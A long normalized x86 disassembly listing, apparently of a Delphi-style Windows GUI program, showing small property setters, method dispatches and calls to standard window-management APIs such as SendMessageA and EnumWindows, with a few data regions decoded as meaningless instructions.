pop ebx
pop ecx
pop ebp
retn
sub_43c494
mov eax [ eax + 0x22c ]
call sub_437cc0
retn
sub_43c529
jmp sub_403a98
sub_43c530
pop ecx
pop ebp
retn
sub_43c534
mov eax [ r-xdata ]
retn
sub_43c745
jmp sub_403a98
sub_43c74c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c900
retn
sub_43ca05
jmp sub_403a98
sub_43ca0c
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43caf8
mov edx eax
fld [ edx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_43cb14
mov edx eax
fld [ edx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_43cb30
add esp 0xfffffff8
mov edx [ eax + 0x210 ]
mov [ esp ] edx
mov edx [ eax + 0x214 ]
mov [ esp + 0x4 ] edx
fld [ esp ]
pop ecx
pop edx
retn
sub_43cb4c
push esi
mov esi [ eax + 0x208 ]
cmp edx esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43cbe5
jmp sub_4037e4
sub_43ce68
jmp sub_403a98
sub_43ce6f
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43cfa4
jmp sub_403a98
sub_43cfab
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43d1e4
mov edx [ eax ]
or edx [ eax + 0x4 ]
or edx [ eax + 0x8 ]
or edx [ eax + 0xc ]
sete al
retn
sub_43d33a
jmp sub_403a98
sub_43d341
push 0x6
call GetSystemMetrics
mov edx eax
shl edx 0x3
add edx [ ebp - 0x78 ]
mov eax [ ebp - 0x4 ]
call sub_44e094
pop ebx
mov esp ebp
pop ebp
retn
sub_43d360
cmp [ eax + 0x269 ] 0x0
jne r-xdata
mov [ eax + 0x252 ] 0x0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
sub_43d43a
add [ eax ] al
push ebx
cmp [ eax + 0x282 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
sub_43d4a4
push ebx
mov ebx eax
mov eax ebx
call sub_4545e8
push 0xffffffff
push 0x0
mov eax ebx
call sub_4550b4
push eax
call InvalidateRect
pop ebx
retn
sub_43d6fa
jmp sub_403a98
sub_43d701
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d708
push ebx
mov ebx eax
mov eax ebx
call sub_4550b4
call sub_42ade4
pop ebx
retn
sub_43d71c
add esp 0xfffffff8
mov edx [ eax + 0x210 ]
mov [ esp ] edx
mov edx [ eax + 0x214 ]
mov [ esp + 0x4 ] edx
fld [ esp ]
pop ecx
pop edx
retn
sub_43d808
jmp sub_403a98
sub_43d850
cmp dl [ eax + 0x250 ]
je r-xdata
retn
mov [ eax + 0x250 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
sete cl
mov edx 0x20
call sub_436958
sub_43d8c8
cmp dl [ eax + 0x253 ]
je r-xdata
retn
mov [ eax + 0x253 ] dl
call sub_452654
sub_43d8dc
cmp dl [ eax + 0x254 ]
je r-xdata
retn
mov [ eax + 0x254 ] dl
call sub_452654
sub_43d8f0
cmp dl [ eax + 0x256 ]
je r-xdata
retn
mov [ eax + 0x256 ] dl
call sub_452654
sub_43d904
cmp dl [ eax + 0x268 ]
je r-xdata
retn
mov [ eax + 0x268 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx edx
mov edx 0x10
call sub_436958
sub_43d928
cmp dl [ eax + 0x269 ]
je r-xdata
retn
mov [ eax + 0x269 ] dl
call sub_452654
sub_43dad0
push ebx
mov ebx eax
mov eax ebx
call sub_4197f8
mov eax ebx
call sub_4196d8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43db3c
push ebx
mov ebx eax
mov [ ebx + 0x20 ] edx
mov eax ebx
call sub_4196d8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43db58
push ebx
mov ebx eax
mov [ ebx + 0x1c ] edx
mov eax ebx
call sub_4196d8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43db74
push ebx
mov ebx eax
mov eax ebx
call sub_431f04
pop ebx
retn
sub_43dbe8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_432070
pop esi
pop ebx
retn
sub_43dd8d
add [ esp + 0x4 ] 0xffffffec
jmp sub_43ef5c
sub_43dd97
add [ esp + 0x4 ] 0xffffffec
jmp sub_43f048
sub_43dda1
add [ esp + 0x4 ] 0xffffffec
jmp sub_43f034
sub_43ddab
add [ esp + 0x4 ] 0xffffffec
jmp sub_43eeac
sub_43ddbf
add [ esp + 0x4 ] 0xffffffec
jmp sub_405b8c
sub_43ddc9
add [ esp + 0x4 ] 0xffffffec
jmp sub_405ba0
sub_43e314
push ebx
push esi
mov esi eax
mov eax [ esi + 0x274 ]
push eax
mov ecx [ esi + 0x270 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_43e54b
jmp sub_403a98
sub_43e647
jmp sub_403a98
sub_43e64e
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43e654
bound esp [ edi ]
mov ebx 0xd06a7700
adc [ ebp + 0x4fc00035 ] esp
xlat
shl [ edx - 0x75 ] 0x1
cmp [ edx + eax ] 0x0
add [ ebx + 0x1452ff10 ] cl
retn
sub_43e670
mov eax [ r-xdata ]
retn
sub_43e678
mov eax [ r-xdata ]
retn
sub_43e77a
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x10
retn
sub_43e911
jmp sub_403a98
sub_43e918
pop ebx
pop ecx
pop ebp
retn
sub_43e9e2
jmp sub_403a98
sub_43e9e9
pop ecx
pop ebp
retn
sub_43ea78
mov eax [ eax + 0x14 ]
call sub_419d18
retn
sub_43ebc1
jmp sub_403a98
sub_43ebc8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43ebf4
mov eax [ eax + 0x14 ]
call sub_419a38
retn
sub_43ec00
mov eax [ eax + 0x14 ]
call sub_419a38
retn
sub_43ec0c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_432070
mov eax [ eax + 0x14 ]
pop esi
pop ebx
retn
sub_43ec70
mov ecx [ eax ]
call [ ecx + 0x54 ]
retn
sub_43ec78
push ebx
mov ebx ecx
mov eax [ eax + 0x14 ]
call sub_43dbfc
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop ebx
retn
sub_43ecc0
push esi
mov esi ecx
mov eax [ eax + 0x14 ]
call sub_43dbfc
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x24 ]
pop esi
retn
sub_43ed14
mov eax [ r-xdata ]
retn
sub_43ed1c
mov eax [ r-xdata ]
retn
sub_43ed8c
jmp sub_403a98
sub_43ed93
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_43ee68
jmp sub_403a98
sub_43ee6f
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_43ef2c
mov eax [ eax + 0xc ]
call sub_419a38
retn
sub_43f022
jmp sub_403a98
sub_43f029
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43f034
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax + 0x10 ] edx
xor eax eax
pop ebp
retn 0x4
sub_43f0e3
jmp sub_403a98
sub_43f0ea
pop ebp
retn
sub_43f0ec
sub [ rw-data ] 0x1
retn
sub_43f3fc
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43f414
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_43f458
push ebx
mov ebx eax
mov eax ebx
call sub_43fb80
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_43fb6f
jmp sub_403a98
sub_43fb80
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42d448
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_43f428
sub_43fbd7
jmp sub_403a98
sub_43fbde
pop ebp
retn
sub_43fbe0
sub [ rw-data ] 0x1
retn
sub_443840
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_443a0f
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x1ae1172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_443dca
jmp sub_403a98
sub_443dd1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443e56
jmp sub_403a98
sub_443e5d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443e64
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_451974
pop ebx
retn
sub_443e78
push ebx
mov ebx eax
mov eax ebx
call sub_4546cc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_451974
pop ebx
retn
sub_443e94
push ebx
mov ebx eax
mov eax ebx
call sub_4536a0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_443f40
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e8b4
pop esi
pop ebx
retn
sub_4440aa
jmp sub_403a98
sub_4440b1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4441c0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_450988
mov eax ebx
mov si 0xffc7
call sub_403518
pop esi
pop ebx
retn
sub_4442ac
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4442c8
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403518
sub_4442e4
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_4442f0
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_421b4c
sub_444304
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_444364
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4443d8
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403518
pop esi
pop ebx
retn
sub_4443f4
push esi
mov esi eax
mov eax esi
call sub_450494
mov eax esi
mov si 0xffc7
call sub_403518
pop esi
retn
sub_444499
jmp sub_403a98
sub_4444a0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4444a8
push ebx
mov ebx eax
mov eax ebx
call sub_4505f8
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_4444cc
push ebx
mov ebx eax
mov eax ebx
call sub_450610
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_4444f0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x10 ]
call sub_4550b4
push eax
call SendMessageA
pop ebx
retn
sub_444572
jmp sub_403a98
sub_444579
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444664
jmp sub_403a98
sub_44466b
pop ebx
pop ecx
pop ebp
retn
sub_44467d
add [ ebx + 0x2ee81043 ] cl
or al [ ecx ]
add [ eax - 0x18 ] dl
cmp al 0x26
cld
[ esi + 0x5b ]
retn
sub_44483c
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_44e890
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_44488c
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
pop ebx
retn
sub_444980
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_452654
sub_4449b4
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_4449bc
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_4449c4
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_4449f0
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_44fa80
sub_444b20
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_444df7
jmp sub_4037e4
sub_445088
jmp sub_403a98
sub_44508f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445098
push ebx
mov ebx eax
mov eax ebx
call sub_44e4c0
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_4450bc
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_445138
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_445252
jmp sub_403a98
sub_44529c
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
retn
sub_445327
jmp sub_403a98
sub_44532e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445360
mov edx [ eax ]
call [ edx + 0x104 ]
retn
sub_44536c
mov [ eax + 0x210 ] edx
retn
sub_4453bd
jmp sub_403a98
sub_4453c4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44547e
jmp sub_403a98
sub_445528
mov eax [ r-xdata ]
retn
sub_445530
xor eax eax
retn
sub_445554
retn
sub_44566c
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_452654
sub_4456e4
push ebx
mov ebx eax
mov eax ebx
call sub_4657c8
test eax eax
je r-xdata
mov eax ebx
call sub_44fe08
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_445708
xor eax eax
retn
sub_4457cf
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x376d173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_4457e8
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_403518
sub_4458d9
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_4458e2
jmp sub_403a98
j_sub_4458d9
jmp sub_4458d9
sub_4458e9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445a94
push ebx
mov ebx eax
mov eax ebx
call sub_44e4c0
mov eax ebx
call sub_44fe08
pop ebx
retn
sub_445aa8
cmp [ eax + 0x212 ] 0x1
sete al
retn
sub_445ab4
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_452654
sub_445ac8
test dl dl
je r-xdata
xor edx edx
call sub_445adc
retn
mov dl 0x1
call sub_445adc
retn
sub_445bb8
push ebx
mov ebx eax
mov eax ebx
call sub_4536a0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_445bcc
call sub_452654
retn
sub_445c62
jmp sub_403a98
sub_445c69
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445c76
or [ ebx - 0x2f6d00f0 ] cl
add [ eax ] al
add bl al
sub_445ce0
mov al [ eax + 0x211 ]
retn
sub_445d14
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_452654
sub_445ef4
call sub_452654
retn
sub_445f71
jmp sub_403a98
sub_445f78
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445fbc
mov eax [ ebx + 0x10 ]
call sub_4550b4
push eax
call SendMessageA
pop ebx
retn
sub_445ff3
xchg [ eax ] bh
add al [ eax ]
add [ edi * 8 + 0xe73022c ] al
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_447c30
jmp sub_44607a
sub_44607a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446097
lea eax [ ebp - 0x8 ]
call sub_404118
retn
sub_446090
jmp sub_403a98
sub_446097
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_446123
jmp sub_403a98
sub_44612a
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_446269
jmp sub_403a98
sub_446270
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_446305
jmp sub_403a98
sub_44630c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_446314
push esi
mov eax [ eax + 0x10 ]
mov si 0xffae
call sub_403518
pop esi
retn
sub_446452
jmp sub_403a98
sub_446474
jmp sub_403a98
sub_44647b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446484
push esi
mov eax [ eax + 0x10 ]
mov si 0xffaf
call sub_403518
pop esi
retn
sub_4465ee
jmp sub_403a98
sub_44660b
jmp sub_403a98
sub_446612
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4467b5
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
sub_4467c3
jmp sub_403a98
j_sub_4467b5
jmp sub_4467b5
sub_4467ca
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_446818
push esi
mov si 0xffb1
call sub_403518
pop esi
retn
sub_446824
push esi
mov si 0xffb0
call sub_403518
pop esi
retn
sub_446878
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_4469e3
jmp sub_403a98
sub_4469ea
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446b34
mov dl [ eax + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ eax + 0x214 ]
retn
sub_446b58
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x190
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
pop ebx
retn
sub_446bc0
cmp dl [ eax + 0x23b ]
je r-xdata
retn
mov [ eax + 0x23b ] dl
call sub_452654
sub_446c40
cmp edx [ eax + 0x230 ]
je r-xdata
retn
test edx edx
jle r-xdata
mov [ eax + 0x230 ] edx
call sub_452654
sub_446c58
test edx edx
jge r-xdata
cmp edx [ eax + 0x23c ]
je r-xdata
xor edx edx
retn
mov [ eax + 0x23c ] edx
call sub_452654
sub_446c74
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_452654
sub_446d88
mov cl [ eax + 0x238 ]
add cl 0xfd
sub cl 0x2
jb r-xdata
retn
cmp dl [ eax + 0x23a ]
je r-xdata
mov [ eax + 0x23a ] dl
call sub_452654
sub_446de8
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18e
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
pop ebx
retn
sub_446eac
jmp sub_403a98
sub_446eb3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446f4e
jmp sub_403a98
sub_446f55
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446f5c
cmp dl [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] dl
call sub_452654
sub_447598
push ebx
mov ebx eax
mov eax ebx
call sub_4536a0
mov eax ebx
call sub_446a60
pop ebx
retn
sub_447718
jmp sub_403a98
sub_44771f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_447728
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_447b3c
jmp sub_403a98
sub_447b43
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447c20
jmp sub_403a98
sub_447c27
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447c30
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_447c9c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x193
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
pop ebx
retn
sub_44806f
jmp sub_403a98
sub_448076
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_448080
mov ecx [ eax + 0x214 ]
push ecx
mov ecx [ eax + 0x210 ]
call sub_447f38
retn
sub_4480ec
mov ecx [ eax + 0x214 ]
push ecx
mov ecx edx
mov edx [ eax + 0x20c ]
call sub_447f38
retn
sub_448104
push edx
mov ecx [ eax + 0x210 ]
mov edx [ eax + 0x20c ]
call sub_447f38
retn
sub_448118
push ebx
mov ebx eax
mov eax ebx
call sub_44e4c0
cmp [ ebx + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_44813c
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_448274
call sub_44815c
retn
sub_44827c
call sub_44815c
retn
sub_4482ac
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_4482d9
jmp sub_403a98
sub_4482e0
pop ebp
retn
sub_4482e4
sub [ rw-data ] 0x1
retn
sub_448441
jmp sub_403a98
sub_448448
pop ebp
retn
sub_44844c
sub [ rw-data ] 0x1
retn
sub_448457
add bh bh
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_448ccc
sub_448465
add eax 0xffffffe0
jmp sub_448a4c
sub_44846d
add eax 0xffffffe0
jmp sub_448ab4
sub_448475
add eax 0xffffffe0
jmp sub_448bc8
sub_44847d
add eax 0xffffffe0
jmp sub_448c3c
sub_448485
add eax 0xffffffe0
jmp sub_4486f8
sub_44848d
add eax 0xffffffe0
jmp sub_44870c
sub_448495
add eax 0xffffffe0
jmp sub_448784
sub_44849d
add eax 0xffffffe0
jmp sub_448828
sub_4484a5
add eax 0xffffffe0
jmp sub_44882c
sub_4484ad
add eax 0xffffffe0
jmp sub_4488b4
sub_4484b5
add eax 0xffffffe0
jmp sub_4489fc
sub_4484bd
add eax 0xffffffe0
jmp sub_448a00
sub_4484c5
add eax 0xffffffe0
jmp sub_448a1c
sub_4484d7
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405b8c
sub_4484e1
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405ba0
sub_4486b5
jmp sub_403a98
sub_4486bc
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4486f8
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_40416c
pop ebx
retn
sub_448773
jmp sub_403a98
sub_44877a
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44880c
jmp sub_403a98
sub_448813
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_448828
mov al 0x1
retn
sub_4488a7
jmp sub_403a98
sub_4488ae
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4489ac
jmp sub_403a98
sub_4489b3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4489fc
mov [ eax + 0xc ] edx
retn
sub_448a00
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_448aa4
jmp sub_403a98
sub_448aab
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448baa
jmp sub_403a98
sub_448bb1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448c2a
jmp sub_403a98
sub_448c31
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_448cbc
jmp sub_403a98
sub_448cc3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448db7
jmp sub_403a98
sub_448dbe
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_448e80
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_448dcc
call EnumWindows
retn
sub_448f12
jmp sub_403a98
sub_448f19
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_448f24
xor eax eax
retn
sub_44901d
jmp sub_403a98
sub_449024
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44910e
jmp sub_403a98
sub_449115
pop ebp
retn
sub_44916a
jmp sub_403a98
sub_449171
pop ebp
retn
sub_44a267
add [ eax - 0x25 ] al
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + 0xb ] bl
inc ebp
add [ ebx + ecx - 0x197bffbb ] al
inc esp
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ eax - 0x63ffbb19 ] cl
0xe9480044 0x44
sub_44a30c
jmp r-xdata
sub_44a30e
0xe8ffe9ff 0xe7ff
sub_44a315
jmp esi
sub_44a424
inc esp
add [ eax - 0x4bffbb10 ] dh
hlt
sub_44a42c
inc esp
add al cl
hlt
sub_44ad27
add [ eax - 0x25 ] al
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + 0xb ] bl
inc ebp
add [ ebx + ecx - 0x197bffbb ] al
inc esp
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ eax - 0x63ffbb19 ] cl
0xe9480044 0x44
sub_44b1ad
add eax 0xffffff8c
jmp sub_457740
sub_44b1b5
add eax 0xffffff8c
jmp sub_457744
sub_44b1bd
add eax 0xffffff8c
jmp sub_457830
sub_44b1c5
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_44b1d2
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_44b1df
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_44b1ec
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_44b1f9
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_44b206
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_44b213
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_44b220
add eax 0xffffff8c
jmp sub_458ea0
sub_44b232
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405b8c
sub_44b23c
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405ba0
sub_44b694
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_44b9a7
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_41861c
retn
sub_44b9c4
push 0x15
mov ecx rw-data
call sub_4185dc
retn
sub_44ba5c
call GetCapture
call sub_44b794
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_44bcc0
push ebx
push eax
push sub_44be44
call sub_422bc8
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_44bcd8
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_44bd08
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_422c7c
pop ebx
retn
sub_44bde6
jmp sub_4037e4
sub_44be18
xor eax eax
retn
sub_44be1c
push ebp
mov ebp esp
